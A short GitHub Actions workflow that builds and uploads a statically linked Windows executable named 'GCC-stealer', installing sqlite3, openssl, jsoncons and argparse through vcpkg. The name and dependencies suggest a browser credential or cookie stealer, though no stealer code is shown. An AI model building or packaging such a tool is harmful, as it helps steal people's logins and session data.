name: Build for Windows
on: 
  push:
  pull_request:
  release:
    types: # This configuration does not affect the page_build event above
      - created

jobs:
  build:
      #if: github.event_name == 'push' && contains(toJson(github.event.commits), '***NO_CI***') == false && contains(toJson(github.event.commits), '[ci skip]') == false && contains(toJson(github.event.commits), '[skip ci]') == false
      runs-on: windows-2019
      steps:
          - uses: actions/checkout@v1
            with:
                submodules: true
                  
          - name: Set triplet to only build release
            run: |
                "`r`nset(VCPKG_BUILD_TYPE release)" | Add-Content "$env:VCPKG_INSTALLATION_ROOT\triplets\x64-windows-static.cmake"
                
          - name: Install deps with vcpkg
            run: |
                vcpkg install --triplet x64-windows-static sqlite3 openssl jsoncons argparse
          
          - name: Create GCC-stealer version
            run: |
                cmake -S . -B build -DCMAKE_TOOLCHAIN_FILE="$env:VCPKG_INSTALLATION_ROOT/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
     
          - name: Build GCC-stealer in Release mode
            run: |
                cmake --build build --config Release
          
          - name: Upload binary to artifact
            uses: actions/upload-artifact@master
            with:
              name: GCC-stealer.exe
              path: build/GCC-stealer.exe
                
